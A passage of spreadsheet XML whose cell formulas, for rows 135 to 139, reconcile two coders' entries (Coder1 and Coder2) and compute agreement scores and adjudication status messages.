        <f>IF(AND(Coder1!G135&amp;""&lt;&gt;"",Coder1!G135&amp;""=Coder2!G135&amp;""),Coder1!G135,"")</f>
        <v/>
      </c>
      <c r="H135" s="14">
        <f>IF(AND(Coder1!H135&amp;""&lt;&gt;"",Coder1!H135&amp;""=Coder2!H135&amp;""),Coder1!H135,"")</f>
        <v/>
      </c>
      <c r="I135" s="14">
        <f>IF(AND(Coder1!I135&amp;""&lt;&gt;"",Coder1!I135&amp;""=Coder2!I135&amp;""),Coder1!I135,"")</f>
        <v/>
      </c>
      <c r="J135" s="14">
        <f>IF(AND(Coder1!J135&amp;""&lt;&gt;"",Coder1!J135&amp;""=Coder2!J135&amp;""),Coder1!J135,"")</f>
        <v/>
      </c>
      <c r="K135" s="14">
        <f>IF(AND(Coder1!K135&amp;""&lt;&gt;"",Coder1!K135&amp;""=Coder2!K135&amp;""),Coder1!K135,"")</f>
        <v/>
      </c>
      <c r="L135" s="14">
        <f>IF(AND(Coder1!L135&amp;""&lt;&gt;"",Coder1!L135&amp;""=Coder2!L135&amp;""),Coder1!L135,"")</f>
        <v/>
      </c>
      <c r="M135" s="14">
        <f>IF(AND(Coder1!M135&amp;""&lt;&gt;"",Coder1!M135&amp;""=Coder2!M135&amp;""),Coder1!M135,"")</f>
        <v/>
      </c>
      <c r="N135" s="14">
        <f>IF(AND(Coder1!N135&amp;""&lt;&gt;"",Coder1!N135&amp;""=Coder2!N135&amp;""),Coder1!N135,"")</f>
        <v/>
      </c>
      <c r="O135" s="14">
        <f>IF(AND(Coder1!O135&amp;""&lt;&gt;"",Coder1!O135&amp;""=Coder2!O135&amp;""),Coder1!O135,"")</f>
        <v/>
      </c>
      <c r="P135" s="14">
        <f>IF(AND(Coder1!P135&amp;""&lt;&gt;"",Coder1!P135&amp;""=Coder2!P135&amp;""),Coder1!P135,"")</f>
        <v/>
      </c>
      <c r="Q135" s="14">
        <f>IF(AND(Coder1!Q135&amp;""&lt;&gt;"",Coder1!Q135&amp;""=Coder2!Q135&amp;""),Coder1!Q135,"")</f>
        <v/>
      </c>
      <c r="R135" s="14">
        <f>IF(AND(Coder1!R135&amp;""&lt;&gt;"",Coder1!R135&amp;""=Coder2!R135&amp;""),Coder1!R135,"")</f>
        <v/>
      </c>
      <c r="S135" s="14">
        <f>IF(AND(Coder1!S135&amp;""&lt;&gt;"",Coder1!S135&amp;""=Coder2!S135&amp;""),Coder1!S135,"")</f>
        <v/>
      </c>
      <c r="T135" s="14">
        <f>IF(AND(Coder1!T135&amp;""&lt;&gt;"",Coder1!T135&amp;""=Coder2!T135&amp;""),Coder1!T135,"")</f>
        <v/>
      </c>
      <c r="U135" s="14">
        <f>IF(AND(Coder1!U135&amp;""&lt;&gt;"",Coder1!U135&amp;""=Coder2!U135&amp;""),Coder1!U135,"")</f>
        <v/>
      </c>
      <c r="V135" s="14">
        <f>IF(AND(Coder1!V135&amp;""&lt;&gt;"",Coder1!V135&amp;""=Coder2!V135&amp;""),Coder1!V135,"")</f>
        <v/>
      </c>
      <c r="W135" s="14">
        <f>IF(AND(Coder1!W135&amp;""&lt;&gt;"",Coder1!W135&amp;""=Coder2!W135&amp;""),Coder1!W135,"")</f>
        <v/>
      </c>
      <c r="X135" s="14">
        <f>IF(AND(Coder1!X135&amp;""&lt;&gt;"",Coder1!X135&amp;""=Coder2!X135&amp;""),Coder1!X135,"")</f>
        <v/>
      </c>
      <c r="Y135" s="14">
        <f>IF(AND(Coder1!Y135&amp;""&lt;&gt;"",Coder1!Y135&amp;""=Coder2!Y135&amp;""),Coder1!Y135,"")</f>
        <v/>
      </c>
      <c r="Z135" s="14">
        <f>IF(AND(Coder1!Z135&amp;""&lt;&gt;"",Coder1!Z135&amp;""=Coder2!Z135&amp;""),Coder1!Z135,"")</f>
        <v/>
      </c>
      <c r="AA135" s="14">
        <f>IF(AND(Coder1!AA135&amp;""&lt;&gt;"",Coder1!AA135&amp;""=Coder2!AA135&amp;""),Coder1!AA135,"")</f>
        <v/>
      </c>
      <c r="AB135" s="14">
        <f>IF(AND(Coder1!AB135&amp;""&lt;&gt;"",Coder1!AB135&amp;""=Coder2!AB135&amp;""),Coder1!AB135,"")</f>
        <v/>
      </c>
      <c r="AC135" s="14">
        <f>IF(AND(Coder1!AC135&amp;""&lt;&gt;"",Coder1!AC135&amp;""=Coder2!AC135&amp;""),Coder1!AC135,"")</f>
        <v/>
      </c>
      <c r="AD135" s="14">
        <f>IF(AND(Coder1!AD135&amp;""&lt;&gt;"",Coder1!AD135&amp;""=Coder2!AD135&amp;""),Coder1!AD135,"")</f>
        <v/>
      </c>
      <c r="AE135" s="14">
        <f>IF(AND(Coder1!AE135&amp;""&lt;&gt;"",Coder1!AE135&amp;""=Coder2!AE135&amp;""),Coder1!AE135,"")</f>
        <v/>
      </c>
      <c r="AF135" s="14">
        <f>IF(AND(Coder1!AF135&amp;""&lt;&gt;"",Coder1!AF135&amp;""=Coder2!AF135&amp;""),Coder1!AF135,"")</f>
        <v/>
      </c>
      <c r="AG135" s="14">
        <f>IF(AND(Coder1!AG135&amp;""&lt;&gt;"",Coder1!AG135&amp;""=Coder2!AG135&amp;""),Coder1!AG135,"")</f>
        <v/>
      </c>
      <c r="AH135" s="14">
        <f>IF(AND(Coder1!AH135&amp;""&lt;&gt;"",Coder1!AH135&amp;""=Coder2!AH135&amp;""),Coder1!AH135,"")</f>
        <v/>
      </c>
      <c r="AI135" s="11">
        <f>IF(COUNT(E135:L135)=0,"",SUM(E135:L135))</f>
        <v/>
      </c>
      <c r="AJ135" s="11">
        <f>IF(AI135="","",N(E135)*3+N(F135)*2+N(G135)*2+N(H135)*2+N(I135)*2+N(J135)*3+N(K135)*3+N(L135)*3)</f>
        <v/>
      </c>
      <c r="AK135" s="11">
        <f>IF(AI135="","",COUNTIF(N135:AG135,1))</f>
        <v/>
      </c>
      <c r="AL135" s="11">
        <f>IF(OR(AJ135="",AJ135=0),"",ROUND(100*(AJ135-AK135)/AJ135,1))</f>
        <v/>
      </c>
      <c r="AM135" s="11">
        <f>IF(AND(Coder1!AN135=1,Coder2!AN135=1),IF(COUNTBLANK(E135:AH135)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN135" s="11">
        <f>IF(AND(Coder1!AN135=1,Coder2!AN135=1),IF(SUMPRODUCT(--(Coder1!E135:AH135&amp;""&lt;&gt;Coder2!E135:AH135&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO135" s="11" t="n"/>
    </row>
    <row r="136">
      <c r="A136" s="11">
        <f>Coder1!A136</f>
        <v/>
      </c>
      <c r="B136" s="11">
        <f>Coder1!B136</f>
        <v/>
      </c>
      <c r="C136" s="11">
        <f>Coder1!C136</f>
        <v/>
      </c>
      <c r="D136" s="11">
        <f>Coder1!D136</f>
        <v/>
      </c>
      <c r="E136" s="14">
        <f>IF(AND(Coder1!E136&amp;""&lt;&gt;"",Coder1!E136&amp;""=Coder2!E136&amp;""),Coder1!E136,"")</f>
        <v/>
      </c>
      <c r="F136" s="14">
        <f>IF(AND(Coder1!F136&amp;""&lt;&gt;"",Coder1!F136&amp;""=Coder2!F136&amp;""),Coder1!F136,"")</f>
        <v/>
      </c>
      <c r="G136" s="14">
        <f>IF(AND(Coder1!G136&amp;""&lt;&gt;"",Coder1!G136&amp;""=Coder2!G136&amp;""),Coder1!G136,"")</f>
        <v/>
      </c>
      <c r="H136" s="14">
        <f>IF(AND(Coder1!H136&amp;""&lt;&gt;"",Coder1!H136&amp;""=Coder2!H136&amp;""),Coder1!H136,"")</f>
        <v/>
      </c>
      <c r="I136" s="14">
        <f>IF(AND(Coder1!I136&amp;""&lt;&gt;"",Coder1!I136&amp;""=Coder2!I136&amp;""),Coder1!I136,"")</f>
        <v/>
      </c>
      <c r="J136" s="14">
        <f>IF(AND(Coder1!J136&amp;""&lt;&gt;"",Coder1!J136&amp;""=Coder2!J136&amp;""),Coder1!J136,"")</f>
        <v/>
      </c>
      <c r="K136" s="14">
        <f>IF(AND(Coder1!K136&amp;""&lt;&gt;"",Coder1!K136&amp;""=Coder2!K136&amp;""),Coder1!K136,"")</f>
        <v/>
      </c>
      <c r="L136" s="14">
        <f>IF(AND(Coder1!L136&amp;""&lt;&gt;"",Coder1!L136&amp;""=Coder2!L136&amp;""),Coder1!L136,"")</f>
        <v/>
      </c>
      <c r="M136" s="14">
        <f>IF(AND(Coder1!M136&amp;""&lt;&gt;"",Coder1!M136&amp;""=Coder2!M136&amp;""),Coder1!M136,"")</f>
        <v/>
      </c>
      <c r="N136" s="14">
        <f>IF(AND(Coder1!N136&amp;""&lt;&gt;"",Coder1!N136&amp;""=Coder2!N136&amp;""),Coder1!N136,"")</f>
        <v/>
      </c>
      <c r="O136" s="14">
        <f>IF(AND(Coder1!O136&amp;""&lt;&gt;"",Coder1!O136&amp;""=Coder2!O136&amp;""),Coder1!O136,"")</f>
        <v/>
      </c>
      <c r="P136" s="14">
        <f>IF(AND(Coder1!P136&amp;""&lt;&gt;"",Coder1!P136&amp;""=Coder2!P136&amp;""),Coder1!P136,"")</f>
        <v/>
      </c>
      <c r="Q136" s="14">
        <f>IF(AND(Coder1!Q136&amp;""&lt;&gt;"",Coder1!Q136&amp;""=Coder2!Q136&amp;""),Coder1!Q136,"")</f>
        <v/>
      </c>
      <c r="R136" s="14">
        <f>IF(AND(Coder1!R136&amp;""&lt;&gt;"",Coder1!R136&amp;""=Coder2!R136&amp;""),Coder1!R136,"")</f>
        <v/>
      </c>
      <c r="S136" s="14">
        <f>IF(AND(Coder1!S136&amp;""&lt;&gt;"",Coder1!S136&amp;""=Coder2!S136&amp;""),Coder1!S136,"")</f>
        <v/>
      </c>
      <c r="T136" s="14">
        <f>IF(AND(Coder1!T136&amp;""&lt;&gt;"",Coder1!T136&amp;""=Coder2!T136&amp;""),Coder1!T136,"")</f>
        <v/>
      </c>
      <c r="U136" s="14">
        <f>IF(AND(Coder1!U136&amp;""&lt;&gt;"",Coder1!U136&amp;""=Coder2!U136&amp;""),Coder1!U136,"")</f>
        <v/>
      </c>
      <c r="V136" s="14">
        <f>IF(AND(Coder1!V136&amp;""&lt;&gt;"",Coder1!V136&amp;""=Coder2!V136&amp;""),Coder1!V136,"")</f>
        <v/>
      </c>
      <c r="W136" s="14">
        <f>IF(AND(Coder1!W136&amp;""&lt;&gt;"",Coder1!W136&amp;""=Coder2!W136&amp;""),Coder1!W136,"")</f>
        <v/>
      </c>
      <c r="X136" s="14">
        <f>IF(AND(Coder1!X136&amp;""&lt;&gt;"",Coder1!X136&amp;""=Coder2!X136&amp;""),Coder1!X136,"")</f>
        <v/>
      </c>
      <c r="Y136" s="14">
        <f>IF(AND(Coder1!Y136&amp;""&lt;&gt;"",Coder1!Y136&amp;""=Coder2!Y136&amp;""),Coder1!Y136,"")</f>
        <v/>
      </c>
      <c r="Z136" s="14">
        <f>IF(AND(Coder1!Z136&amp;""&lt;&gt;"",Coder1!Z136&amp;""=Coder2!Z136&amp;""),Coder1!Z136,"")</f>
        <v/>
      </c>
      <c r="AA136" s="14">
        <f>IF(AND(Coder1!AA136&amp;""&lt;&gt;"",Coder1!AA136&amp;""=Coder2!AA136&amp;""),Coder1!AA136,"")</f>
        <v/>
      </c>
      <c r="AB136" s="14">
        <f>IF(AND(Coder1!AB136&amp;""&lt;&gt;"",Coder1!AB136&amp;""=Coder2!AB136&amp;""),Coder1!AB136,"")</f>
        <v/>
      </c>
      <c r="AC136" s="14">
        <f>IF(AND(Coder1!AC136&amp;""&lt;&gt;"",Coder1!AC136&amp;""=Coder2!AC136&amp;""),Coder1!AC136,"")</f>
        <v/>
      </c>
      <c r="AD136" s="14">
        <f>IF(AND(Coder1!AD136&amp;""&lt;&gt;"",Coder1!AD136&amp;""=Coder2!AD136&amp;""),Coder1!AD136,"")</f>
        <v/>
      </c>
      <c r="AE136" s="14">
        <f>IF(AND(Coder1!AE136&amp;""&lt;&gt;"",Coder1!AE136&amp;""=Coder2!AE136&amp;""),Coder1!AE136,"")</f>
        <v/>
      </c>
      <c r="AF136" s="14">
        <f>IF(AND(Coder1!AF136&amp;""&lt;&gt;"",Coder1!AF136&amp;""=Coder2!AF136&amp;""),Coder1!AF136,"")</f>
        <v/>
      </c>
      <c r="AG136" s="14">
        <f>IF(AND(Coder1!AG136&amp;""&lt;&gt;"",Coder1!AG136&amp;""=Coder2!AG136&amp;""),Coder1!AG136,"")</f>
        <v/>
      </c>
      <c r="AH136" s="14">
        <f>IF(AND(Coder1!AH136&amp;""&lt;&gt;"",Coder1!AH136&amp;""=Coder2!AH136&amp;""),Coder1!AH136,"")</f>
        <v/>
      </c>
      <c r="AI136" s="11">
        <f>IF(COUNT(E136:L136)=0,"",SUM(E136:L136))</f>
        <v/>
      </c>
      <c r="AJ136" s="11">
        <f>IF(AI136="","",N(E136)*3+N(F136)*2+N(G136)*2+N(H136)*2+N(I136)*2+N(J136)*3+N(K136)*3+N(L136)*3)</f>
        <v/>
      </c>
      <c r="AK136" s="11">
        <f>IF(AI136="","",COUNTIF(N136:AG136,1))</f>
        <v/>
      </c>
      <c r="AL136" s="11">
        <f>IF(OR(AJ136="",AJ136=0),"",ROUND(100*(AJ136-AK136)/AJ136,1))</f>
        <v/>
      </c>
      <c r="AM136" s="11">
        <f>IF(AND(Coder1!AN136=1,Coder2!AN136=1),IF(COUNTBLANK(E136:AH136)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN136" s="11">
        <f>IF(AND(Coder1!AN136=1,Coder2!AN136=1),IF(SUMPRODUCT(--(Coder1!E136:AH136&amp;""&lt;&gt;Coder2!E136:AH136&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO136" s="11" t="n"/>
    </row>
    <row r="137">
      <c r="A137" s="11">
        <f>Coder1!A137</f>
        <v/>
      </c>
      <c r="B137" s="11">
        <f>Coder1!B137</f>
        <v/>
      </c>
      <c r="C137" s="11">
        <f>Coder1!C137</f>
        <v/>
      </c>
      <c r="D137" s="11">
        <f>Coder1!D137</f>
        <v/>
      </c>
      <c r="E137" s="14">
        <f>IF(AND(Coder1!E137&amp;""&lt;&gt;"",Coder1!E137&amp;""=Coder2!E137&amp;""),Coder1!E137,"")</f>
        <v/>
      </c>
      <c r="F137" s="14">
        <f>IF(AND(Coder1!F137&amp;""&lt;&gt;"",Coder1!F137&amp;""=Coder2!F137&amp;""),Coder1!F137,"")</f>
        <v/>
      </c>
      <c r="G137" s="14">
        <f>IF(AND(Coder1!G137&amp;""&lt;&gt;"",Coder1!G137&amp;""=Coder2!G137&amp;""),Coder1!G137,"")</f>
        <v/>
      </c>
      <c r="H137" s="14">
        <f>IF(AND(Coder1!H137&amp;""&lt;&gt;"",Coder1!H137&amp;""=Coder2!H137&amp;""),Coder1!H137,"")</f>
        <v/>
      </c>
      <c r="I137" s="14">
        <f>IF(AND(Coder1!I137&amp;""&lt;&gt;"",Coder1!I137&amp;""=Coder2!I137&amp;""),Coder1!I137,"")</f>
        <v/>
      </c>
      <c r="J137" s="14">
        <f>IF(AND(Coder1!J137&amp;""&lt;&gt;"",Coder1!J137&amp;""=Coder2!J137&amp;""),Coder1!J137,"")</f>
        <v/>
      </c>
      <c r="K137" s="14">
        <f>IF(AND(Coder1!K137&amp;""&lt;&gt;"",Coder1!K137&amp;""=Coder2!K137&amp;""),Coder1!K137,"")</f>
        <v/>
      </c>
      <c r="L137" s="14">
        <f>IF(AND(Coder1!L137&amp;""&lt;&gt;"",Coder1!L137&amp;""=Coder2!L137&amp;""),Coder1!L137,"")</f>
        <v/>
      </c>
      <c r="M137" s="14">
        <f>IF(AND(Coder1!M137&amp;""&lt;&gt;"",Coder1!M137&amp;""=Coder2!M137&amp;""),Coder1!M137,"")</f>
        <v/>
      </c>
      <c r="N137" s="14">
        <f>IF(AND(Coder1!N137&amp;""&lt;&gt;"",Coder1!N137&amp;""=Coder2!N137&amp;""),Coder1!N137,"")</f>
        <v/>
      </c>
      <c r="O137" s="14">
        <f>IF(AND(Coder1!O137&amp;""&lt;&gt;"",Coder1!O137&amp;""=Coder2!O137&amp;""),Coder1!O137,"")</f>
        <v/>
      </c>
      <c r="P137" s="14">
        <f>IF(AND(Coder1!P137&amp;""&lt;&gt;"",Coder1!P137&amp;""=Coder2!P137&amp;""),Coder1!P137,"")</f>
        <v/>
      </c>
      <c r="Q137" s="14">
        <f>IF(AND(Coder1!Q137&amp;""&lt;&gt;"",Coder1!Q137&amp;""=Coder2!Q137&amp;""),Coder1!Q137,"")</f>
        <v/>
      </c>
      <c r="R137" s="14">
        <f>IF(AND(Coder1!R137&amp;""&lt;&gt;"",Coder1!R137&amp;""=Coder2!R137&amp;""),Coder1!R137,"")</f>
        <v/>
      </c>
      <c r="S137" s="14">
        <f>IF(AND(Coder1!S137&amp;""&lt;&gt;"",Coder1!S137&amp;""=Coder2!S137&amp;""),Coder1!S137,"")</f>
        <v/>
      </c>
      <c r="T137" s="14">
        <f>IF(AND(Coder1!T137&amp;""&lt;&gt;"",Coder1!T137&amp;""=Coder2!T137&amp;""),Coder1!T137,"")</f>
        <v/>
      </c>
      <c r="U137" s="14">
        <f>IF(AND(Coder1!U137&amp;""&lt;&gt;"",Coder1!U137&amp;""=Coder2!U137&amp;""),Coder1!U137,"")</f>
        <v/>
      </c>
      <c r="V137" s="14">
        <f>IF(AND(Coder1!V137&amp;""&lt;&gt;"",Coder1!V137&amp;""=Coder2!V137&amp;""),Coder1!V137,"")</f>
        <v/>
      </c>
      <c r="W137" s="14">
        <f>IF(AND(Coder1!W137&amp;""&lt;&gt;"",Coder1!W137&amp;""=Coder2!W137&amp;""),Coder1!W137,"")</f>
        <v/>
      </c>
      <c r="X137" s="14">
        <f>IF(AND(Coder1!X137&amp;""&lt;&gt;"",Coder1!X137&amp;""=Coder2!X137&amp;""),Coder1!X137,"")</f>
        <v/>
      </c>
      <c r="Y137" s="14">
        <f>IF(AND(Coder1!Y137&amp;""&lt;&gt;"",Coder1!Y137&amp;""=Coder2!Y137&amp;""),Coder1!Y137,"")</f>
        <v/>
      </c>
      <c r="Z137" s="14">
        <f>IF(AND(Coder1!Z137&amp;""&lt;&gt;"",Coder1!Z137&amp;""=Coder2!Z137&amp;""),Coder1!Z137,"")</f>
        <v/>
      </c>
      <c r="AA137" s="14">
        <f>IF(AND(Coder1!AA137&amp;""&lt;&gt;"",Coder1!AA137&amp;""=Coder2!AA137&amp;""),Coder1!AA137,"")</f>
        <v/>
      </c>
      <c r="AB137" s="14">
        <f>IF(AND(Coder1!AB137&amp;""&lt;&gt;"",Coder1!AB137&amp;""=Coder2!AB137&amp;""),Coder1!AB137,"")</f>
        <v/>
      </c>
      <c r="AC137" s="14">
        <f>IF(AND(Coder1!AC137&amp;""&lt;&gt;"",Coder1!AC137&amp;""=Coder2!AC137&amp;""),Coder1!AC137,"")</f>
        <v/>
      </c>
      <c r="AD137" s="14">
        <f>IF(AND(Coder1!AD137&amp;""&lt;&gt;"",Coder1!AD137&amp;""=Coder2!AD137&amp;""),Coder1!AD137,"")</f>
        <v/>
      </c>
      <c r="AE137" s="14">
        <f>IF(AND(Coder1!AE137&amp;""&lt;&gt;"",Coder1!AE137&amp;""=Coder2!AE137&amp;""),Coder1!AE137,"")</f>
        <v/>
      </c>
      <c r="AF137" s="14">
        <f>IF(AND(Coder1!AF137&amp;""&lt;&gt;"",Coder1!AF137&amp;""=Coder2!AF137&amp;""),Coder1!AF137,"")</f>
        <v/>
      </c>
      <c r="AG137" s="14">
        <f>IF(AND(Coder1!AG137&amp;""&lt;&gt;"",Coder1!AG137&amp;""=Coder2!AG137&amp;""),Coder1!AG137,"")</f>
        <v/>
      </c>
      <c r="AH137" s="14">
        <f>IF(AND(Coder1!AH137&amp;""&lt;&gt;"",Coder1!AH137&amp;""=Coder2!AH137&amp;""),Coder1!AH137,"")</f>
        <v/>
      </c>
      <c r="AI137" s="11">
        <f>IF(COUNT(E137:L137)=0,"",SUM(E137:L137))</f>
        <v/>
      </c>
      <c r="AJ137" s="11">
        <f>IF(AI137="","",N(E137)*3+N(F137)*2+N(G137)*2+N(H137)*2+N(I137)*2+N(J137)*3+N(K137)*3+N(L137)*3)</f>
        <v/>
      </c>
      <c r="AK137" s="11">
        <f>IF(AI137="","",COUNTIF(N137:AG137,1))</f>
        <v/>
      </c>
      <c r="AL137" s="11">
        <f>IF(OR(AJ137="",AJ137=0),"",ROUND(100*(AJ137-AK137)/AJ137,1))</f>
        <v/>
      </c>
      <c r="AM137" s="11">
        <f>IF(AND(Coder1!AN137=1,Coder2!AN137=1),IF(COUNTBLANK(E137:AH137)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN137" s="11">
        <f>IF(AND(Coder1!AN137=1,Coder2!AN137=1),IF(SUMPRODUCT(--(Coder1!E137:AH137&amp;""&lt;&gt;Coder2!E137:AH137&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO137" s="11" t="n"/>
    </row>
    <row r="138">
      <c r="A138" s="11">
        <f>Coder1!A138</f>
        <v/>
      </c>
      <c r="B138" s="11">
        <f>Coder1!B138</f>
        <v/>
      </c>
      <c r="C138" s="11">
        <f>Coder1!C138</f>
        <v/>
      </c>
      <c r="D138" s="11">
        <f>Coder1!D138</f>
        <v/>
      </c>
      <c r="E138" s="14">
        <f>IF(AND(Coder1!E138&amp;""&lt;&gt;"",Coder1!E138&amp;""=Coder2!E138&amp;""),Coder1!E138,"")</f>
        <v/>
      </c>
      <c r="F138" s="14">
        <f>IF(AND(Coder1!F138&amp;""&lt;&gt;"",Coder1!F138&amp;""=Coder2!F138&amp;""),Coder1!F138,"")</f>
        <v/>
      </c>
      <c r="G138" s="14">
        <f>IF(AND(Coder1!G138&amp;""&lt;&gt;"",Coder1!G138&amp;""=Coder2!G138&amp;""),Coder1!G138,"")</f>
        <v/>
      </c>
      <c r="H138" s="14">
        <f>IF(AND(Coder1!H138&amp;""&lt;&gt;"",Coder1!H138&amp;""=Coder2!H138&amp;""),Coder1!H138,"")</f>
        <v/>
      </c>
      <c r="I138" s="14">
        <f>IF(AND(Coder1!I138&amp;""&lt;&gt;"",Coder1!I138&amp;""=Coder2!I138&amp;""),Coder1!I138,"")</f>
        <v/>
      </c>
      <c r="J138" s="14">
        <f>IF(AND(Coder1!J138&amp;""&lt;&gt;"",Coder1!J138&amp;""=Coder2!J138&amp;""),Coder1!J138,"")</f>
        <v/>
      </c>
      <c r="K138" s="14">
        <f>IF(AND(Coder1!K138&amp;""&lt;&gt;"",Coder1!K138&amp;""=Coder2!K138&amp;""),Coder1!K138,"")</f>
        <v/>
      </c>
      <c r="L138" s="14">
        <f>IF(AND(Coder1!L138&amp;""&lt;&gt;"",Coder1!L138&amp;""=Coder2!L138&amp;""),Coder1!L138,"")</f>
        <v/>
      </c>
      <c r="M138" s="14">
        <f>IF(AND(Coder1!M138&amp;""&lt;&gt;"",Coder1!M138&amp;""=Coder2!M138&amp;""),Coder1!M138,"")</f>
        <v/>
      </c>
      <c r="N138" s="14">
        <f>IF(AND(Coder1!N138&amp;""&lt;&gt;"",Coder1!N138&amp;""=Coder2!N138&amp;""),Coder1!N138,"")</f>
        <v/>
      </c>
      <c r="O138" s="14">
        <f>IF(AND(Coder1!O138&amp;""&lt;&gt;"",Coder1!O138&amp;""=Coder2!O138&amp;""),Coder1!O138,"")</f>
        <v/>
      </c>
      <c r="P138" s="14">
        <f>IF(AND(Coder1!P138&amp;""&lt;&gt;"",Coder1!P138&amp;""=Coder2!P138&amp;""),Coder1!P138,"")</f>
        <v/>
      </c>
      <c r="Q138" s="14">
        <f>IF(AND(Coder1!Q138&amp;""&lt;&gt;"",Coder1!Q138&amp;""=Coder2!Q138&amp;""),Coder1!Q138,"")</f>
        <v/>
      </c>
      <c r="R138" s="14">
        <f>IF(AND(Coder1!R138&amp;""&lt;&gt;"",Coder1!R138&amp;""=Coder2!R138&amp;""),Coder1!R138,"")</f>
        <v/>
      </c>
      <c r="S138" s="14">
        <f>IF(AND(Coder1!S138&amp;""&lt;&gt;"",Coder1!S138&amp;""=Coder2!S138&amp;""),Coder1!S138,"")</f>
        <v/>
      </c>
      <c r="T138" s="14">
        <f>IF(AND(Coder1!T138&amp;""&lt;&gt;"",Coder1!T138&amp;""=Coder2!T138&amp;""),Coder1!T138,"")</f>
        <v/>
      </c>
      <c r="U138" s="14">
        <f>IF(AND(Coder1!U138&amp;""&lt;&gt;"",Coder1!U138&amp;""=Coder2!U138&amp;""),Coder1!U138,"")</f>
        <v/>
      </c>
      <c r="V138" s="14">
        <f>IF(AND(Coder1!V138&amp;""&lt;&gt;"",Coder1!V138&amp;""=Coder2!V138&amp;""),Coder1!V138,"")</f>
        <v/>
      </c>
      <c r="W138" s="14">
        <f>IF(AND(Coder1!W138&amp;""&lt;&gt;"",Coder1!W138&amp;""=Coder2!W138&amp;""),Coder1!W138,"")</f>
        <v/>
      </c>
      <c r="X138" s="14">
        <f>IF(AND(Coder1!X138&amp;""&lt;&gt;"",Coder1!X138&amp;""=Coder2!X138&amp;""),Coder1!X138,"")</f>
        <v/>
      </c>
      <c r="Y138" s="14">
        <f>IF(AND(Coder1!Y138&amp;""&lt;&gt;"",Coder1!Y138&amp;""=Coder2!Y138&amp;""),Coder1!Y138,"")</f>
        <v/>
      </c>
      <c r="Z138" s="14">
        <f>IF(AND(Coder1!Z138&amp;""&lt;&gt;"",Coder1!Z138&amp;""=Coder2!Z138&amp;""),Coder1!Z138,"")</f>
        <v/>
      </c>
      <c r="AA138" s="14">
        <f>IF(AND(Coder1!AA138&amp;""&lt;&gt;"",Coder1!AA138&amp;""=Coder2!AA138&amp;""),Coder1!AA138,"")</f>
        <v/>
      </c>
      <c r="AB138" s="14">
        <f>IF(AND(Coder1!AB138&amp;""&lt;&gt;"",Coder1!AB138&amp;""=Coder2!AB138&amp;""),Coder1!AB138,"")</f>
        <v/>
      </c>
      <c r="AC138" s="14">
        <f>IF(AND(Coder1!AC138&amp;""&lt;&gt;"",Coder1!AC138&amp;""=Coder2!AC138&amp;""),Coder1!AC138,"")</f>
        <v/>
      </c>
      <c r="AD138" s="14">
        <f>IF(AND(Coder1!AD138&amp;""&lt;&gt;"",Coder1!AD138&amp;""=Coder2!AD138&amp;""),Coder1!AD138,"")</f>
        <v/>
      </c>
      <c r="AE138" s="14">
        <f>IF(AND(Coder1!AE138&amp;""&lt;&gt;"",Coder1!AE138&amp;""=Coder2!AE138&amp;""),Coder1!AE138,"")</f>
        <v/>
      </c>
      <c r="AF138" s="14">
        <f>IF(AND(Coder1!AF138&amp;""&lt;&gt;"",Coder1!AF138&amp;""=Coder2!AF138&amp;""),Coder1!AF138,"")</f>
        <v/>
      </c>
      <c r="AG138" s="14">
        <f>IF(AND(Coder1!AG138&amp;""&lt;&gt;"",Coder1!AG138&amp;""=Coder2!AG138&amp;""),Coder1!AG138,"")</f>
        <v/>
      </c>
      <c r="AH138" s="14">
        <f>IF(AND(Coder1!AH138&amp;""&lt;&gt;"",Coder1!AH138&amp;""=Coder2!AH138&amp;""),Coder1!AH138,"")</f>
        <v/>
      </c>
      <c r="AI138" s="11">
        <f>IF(COUNT(E138:L138)=0,"",SUM(E138:L138))</f>
        <v/>
      </c>
      <c r="AJ138" s="11">
        <f>IF(AI138="","",N(E138)*3+N(F138)*2+N(G138)*2+N(H138)*2+N(I138)*2+N(J138)*3+N(K138)*3+N(L138)*3)</f>
        <v/>
      </c>
      <c r="AK138" s="11">
        <f>IF(AI138="","",COUNTIF(N138:AG138,1))</f>
        <v/>
      </c>
      <c r="AL138" s="11">
        <f>IF(OR(AJ138="",AJ138=0),"",ROUND(100*(AJ138-AK138)/AJ138,1))</f>
        <v/>
      </c>
      <c r="AM138" s="11">
        <f>IF(AND(Coder1!AN138=1,Coder2!AN138=1),IF(COUNTBLANK(E138:AH138)&gt;0,"Adjudicate blank cells",""),"Waiting for both coders")</f>
        <v/>
      </c>
      <c r="AN138" s="11">
        <f>IF(AND(Coder1!AN138=1,Coder2!AN138=1),IF(SUMPRODUCT(--(Coder1!E138:AH138&amp;""&lt;&gt;Coder2!E138:AH138&amp;""))=0,1,0),"")</f>
        <v/>
      </c>
      <c r="AO138" s="11" t="n"/>
    </row>
    <row r="139">
      <c r="A139" s="11">
        <f>Coder1!A139</f>
        <v/>
      </c>
      <c r="B139" s="11">
        <f>Coder1!B139</f>
        <v/>
      </c>
      <c r="C139" s="11">
        <f>Coder1!C139</f>
        <v/>
      </c>
      <c r="D139" s="11">
        <f>Coder1!D139</f>
        <v/>
      </c>
      <c r="E139" s="14">
        <f>IF(AND(Coder1!E139&amp;""&lt;&gt;"",Coder1!E139&amp;""=Coder2!E139&amp;""),Coder1!E139,"")</f>
        <v/>
      </c>
      <c r="F139" s="14">
        <f>IF(AND(Coder1!F139&amp;""&lt;&gt;"",Coder1!F139&amp;""=Coder2!F139&amp;""),Coder1!F139,"")</f>
        <v/>
      </c>
      <c r="G139" s="14">
        <f>IF(AND(Coder1!G139&amp;""&lt;&gt;"",Coder1!G139&amp;""=Coder2!G139&amp;""),Coder1!G139,"")</f>
        <v/>
      </c>
      <c r="H139" s="14">
        <f>IF(AND(Coder1!H139&amp;""&lt;&gt;"",Coder1!H139&amp;""=Coder2!H139&amp;""),Coder1!H139,"")</f>
        <v/>
      </c>
      <c r="I139" s="14">
        <f>IF(AND(Coder1!I139&amp;""&lt;&gt;"",Coder1!I139&amp;""=Coder2!I139&amp;""),Coder1!I139,"")</f>
        <v/>
      </c>
      <c r="J139" s="14">
